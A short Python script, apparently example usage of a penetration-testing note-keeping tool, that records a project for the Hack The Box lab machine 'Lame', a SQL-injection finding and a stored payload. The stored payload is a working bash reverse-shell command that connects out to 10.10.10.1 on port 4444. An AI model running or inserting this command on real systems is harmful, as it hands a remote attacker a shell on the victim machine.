from models import Findings, Payload, Project

project = Project("HTB - Lame", "10.10.10.3")

f1 = Findings("SQL injection on /login", "critical")
p1 = Payload("Bash reverse shell", "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1", "reverse_shell")

project.add_finding(f1)
project.add_payload(p1)

print(project.to_dict())